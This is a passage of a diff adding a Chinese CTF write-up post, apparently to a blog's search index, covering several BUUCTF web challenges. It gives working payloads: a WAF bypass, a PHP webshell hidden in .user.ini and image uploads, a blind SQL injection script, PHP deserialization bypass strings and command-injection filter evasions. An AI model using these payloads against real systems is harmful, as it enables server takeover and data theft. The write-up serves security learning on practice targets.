2.将某些字符转换为下划线（包括空格）</p><p>eg:</p><table><thead><tr><th align="left">User input</th><th>Decoded PHP</th><th>variable name</th></tr></thead><tbody><tr><td align="left">%20foo_bar%00</td><td>foo_bar</td><td>foo_bar</td></tr><tr><td align="left">foo%20bar%00</td><td>foo bar</td><td>foo_bar</td></tr><tr><td align="left">foo%5bbar</td><td>foo[bar</td><td>foo_bar</td></tr></tbody></table><p>因此上述waf只能检测<code>num</code>，无法检测<code>%20num</code>。</p><p>payload:</p><pre><code>?%20num=1;var_dump(scandir(chr(47)))?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></pre><h2 id="http走私"><a href="#http走私" class="headerlink" title="http走私"></a>http走私</h2><p>参考：</p><p><a href="https://xz.aliyun.com/t/6631" target="_blank" rel="noopener">从一道题深入HTTP协议与HTTP请求走私</a></p><p><a href="https://blog.csdn.net/a3320315/article/details/102937797" target="_blank" rel="noopener">[RoarCTF 2019]Easy Calc(http走私 &amp;&amp; 利用PHP的字符串解析特性Bypass)</a></p><p>payload：</p><p><code>base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))</code></p><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200508125026890.png" alt></p><h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><h2 id="利用-user-ini上传-隐藏后门"><a href="#利用-user-ini上传-隐藏后门" class="headerlink" title="利用.user.ini上传\隐藏后门"></a><a href="https://www.cnblogs.com/20175211lyz/p/11455355.html#1、利用userini上传隐藏后门" target="_blank" rel="noopener">利用.user.ini上传\隐藏后门</a></h2><p>参考：<a href="https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html" target="_blank" rel="noopener">user.ini文件构成的PHP后门</a></p><p>条件：</p><ul><li>1、服务器脚本语言为PHP</li><li>2、服务器使用CGI／FastCGI模式</li><li>3、上传目录下要有可执行的php文件</li></ul><p>上传<code>.user.ini</code></p><pre><code>GIF89a                  //绕过exif_imagetype()auto_prepend_file=a.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。auto_append_file=a.jpg  //解析后进行包含</code></pre><p>然后再上传<code>a.jpg</code></p><pre><code class="php">GIF89a&lt;script language=&#39;php&#39;&gt; @eval($_POST[&#39;pass&#39;]);&lt;/script&gt;</code></pre><p>这样，在访问此目录的所有php文件时，均会自动包含a.jpg，即我们的webshell</p><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200508160743034.png" alt></p><h2 id="绕过exif-imagetype-的技巧"><a href="#绕过exif-imagetype-的技巧" class="headerlink" title="绕过exif_imagetype()的技巧"></a>绕过exif_imagetype()的技巧</h2><p>0x00</p><pre><code class="php">GIF89a  &lt;script language=&#39;php&#39;&gt; @eval($_POST[&#39;pass&#39;]);&lt;/script&gt;</code></pre><p>0x01</p><pre><code class="php">#define test_width 16#define test_height 7&lt;script language=&#39;php&#39;&gt; @eval($_POST[&#39;pass&#39;]);&lt;/script&gt;</code></pre><h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><p>fuzz参数</p><p>参考：<a href="https://blog.csdn.net/a3320315/article/details/102945940" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/102945940</a></p><pre><code class="python"># encoding=utf-8import osimport requestsimport reimport threadingimport timeprint(&#39;开始时间：  &#39;+  time.asctime( time.localtime(time.time()) ))s1=threading.Semaphore(100)                                            #这儿设置最大的线程数filePath = r&quot;E:/phpstudy_pro/WWW/test/src&quot;os.chdir(filePath)                                                    #改变当前的路径requests.adapters.DEFAULT_RETRIES = 5                                #设置重连次数，防止线程数过高，断开连接files = os.listdir(filePath)session = requests.Session()session.keep_alive = False                                             # 设置连接活跃状态为Falsedef get_content(file):    s1.acquire()                                                    print(&#39;trying   &#39;+file+ &#39;     &#39;+ time.asctime( time.localtime(time.time()) ))    with open(file,encoding=&#39;utf-8&#39;) as f:                            #打开php文件，提取所有的$_GET和$_POST的参数            gets = list(re.findall(&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;, f.read()))            posts = list(re.findall(&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;, f.read()))    data = {}                                                        #所有的$_POST    params = {}                                                        #所有的$_GET    for m in gets:        params[m] = &quot;echo &#39;xxxxxx&#39;;&quot;    for n in posts:        data[n] = &quot;echo &#39;xxxxxx&#39;;&quot;    url = &#39;http://localhost/test/src/&#39;+file    req = session.post(url, data=data, params=params)            #一次性请求所有的GET和POST    req.close()                                                # 关闭请求  释放内存    req.encoding = &#39;utf-8&#39;    content = req.text    #print(content)    if &quot;xxxxxx&quot; in content:                                    #如果发现有可以利用的参数，继续筛选出具体的参数        flag = 0        for a in gets:            req = session.get(url+&#39;?%s=&#39;%a+&quot;echo &#39;xxxxxx&#39;;&quot;)            content = req.text            req.close()                                                # 关闭请求  释放内存            if &quot;xxxxxx&quot; in content:                flag = 1                break        if flag != 1:            for b in posts:                req = session.post(url, data={b:&quot;echo &#39;xxxxxx&#39;;&quot;})                content = req.text                req.close()                                                # 关闭请求  释放内存                if &quot;xxxxxx&quot; in content:                    break        if flag == 1:                                                    #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，            param = a        else:            param = b        print(&#39;找到了利用文件： &#39;+file+&quot;  and 找到了利用的参数：%s&quot; %param)        print(&#39;结束时间：  &#39; + time.asctime(time.localtime(time.time())))    s1.release()for i in files:                                                            #加入多线程   t = threading.Thread(target=get_content, args=(i,))   t.start()</code></pre><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200508162548245.png" alt></p><h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><h2 id="sql-bool盲注"><a href="#sql-bool盲注" class="headerlink" title="sql bool盲注"></a>sql bool盲注</h2><p>payload：</p><p>0x00：0^(ascii(substr((select(flag)from(flag)),1,1))&lt;1)</p><p>0x01：if(ascii(substr((select(flag)from(flag)),1,1))=ascii(‘f’),1,2)</p><pre><code class="python"># encoding=utf-8import requestsimport timeurl = &quot;http://22d04a18-7511-4fce-a4db-af2b9a1e1c1c.node3.buuoj.cn/index.php&quot;data = {    &quot;id&quot; : &quot;&quot;}result = &quot;&quot;for i in range(1,100):    low = 33    high =130    mid = (low+high)&gt;&gt;1    while(low&lt;high):        data[&quot;id&quot;] = &quot;0^&quot; + &quot;(ascii(substr((select(flag)from(flag)),{0},1))&gt;{1})&quot;.format(i,mid)        html = requests.post(url,data=data)        print(data)        if &quot;Hello&quot; in html.text:            low = mid+1        else:            high = mid        mid = (low+high)&gt;&gt;1    if(chr(mid)==&quot; &quot;):        break    result += chr(mid)    print(result)print(&quot;flag: &quot; ,result)</code></pre><h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><h2 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h2><pre><code class="php">&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = &#39;guest&#39;;    }    function __destruct(){        if ($this-&gt;password != 100) {            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        }        if ($this-&gt;username === &#39;admin&#39;) {            global $flag;            echo $flag;        }else{            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        }    }}?&gt;</code></pre><pre><code>__construct()：创建对象时初始化，当一个对象创建时被调用__wakeup()   使用unserialize时触发__sleep()    使用serialize时触发__destruction()：结束时销毁对象，当一个对象销毁时被调用</code></pre><p><strong>public、protected与private在序列化时的区别</strong></p><p><code>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0*\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。</code></p><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200509095320175.png" alt></p><p>实际应为：</p><pre><code>O:4:&quot;Name&quot;:2:{s:11:&quot;%00*%00username&quot;;s:5:&quot;admin&quot;;s:11:&quot;%00*%00password&quot;;i:100;}</code></pre><p><code>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</code></p><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200509095351130.png" alt></p><p>实际应为：</p><pre><code>O:4:&quot;Name&quot;:2:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}</code></pre><p><strong>在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行</strong></p><p>通过反序列化调用__destruct()方法</p><pre><code class="php">&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }}$a = serialize(new Name(&quot;admin&quot;,100));print_r($a);?&gt;</code></pre><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200509094433960.png" alt></p><p>其中name后面的2，代表类中有2个属性，但如果我们把2改成3，就会绕过__wakeup()函数。而且因为是private声明，我们需要在<strong>类名和字段名前面都会加上\0的前缀</strong>。不可见字符在终端输出时变为空。</p><p>payload：</p><pre><code>O:4:%22Name%22:3:{s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;}</code></pre><h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><h2 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h2><p><a href="https://shadow-zz.github.io/2020/05/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行总结</a></p><p><strong>命令执行变量拼接</strong></p><pre><code>/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code></pre><p><strong>过滤bash用sh执行</strong></p><pre><code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></pre><p><strong>内联执行</strong></p><p>将反引号内命令的输出作为输入执行</p><pre><code>?ip=127.0.0.1;cat$IFS$9`ls`</code></pre><p>源码：</p><pre><code class="php">&lt;?phpif(isset($_GET[&#39;ip&#39;])){  $ip = $_GET[&#39;ip&#39;];  if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);    die(&quot;fxck your symbol!&quot;);  } else if(preg_match(&quot;/ /&quot;, $ip)){    die(&quot;fxck your space!&quot;);  } else if(preg_match(&quot;/bash/&quot;, $ip)){    die(&quot;fxck your bash!&quot;);  } else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){    die(&quot;fxck your flag!&quot;);  }  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);  echo &quot;&lt;pre&gt;&quot;;  print_r($a);}?&gt;</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> writeup </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 代码审计 </tag>
+            
+            <tag> ctf </tag>
+            
+            <tag> 靶场 </tag>
+            
+            <tag> sql--堆叠注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>关于linux ls拼接</title>
       <link href="/2020/05/03/%E5%85%B3%E4%BA%8Elinux-ls%E6%8B%BC%E6%8E%A5/"/>
       <url>/2020/05/03/%E5%85%B3%E4%BA%8Elinux-ls%E6%8B%BC%E6%8E%A5/</url>
@@ -155,7 +338,7 @@
       
         <tags>
             
-            <tag> pentset </tag>
+            <tag> pentest </tag>
             
             <tag> msf </tag>
             
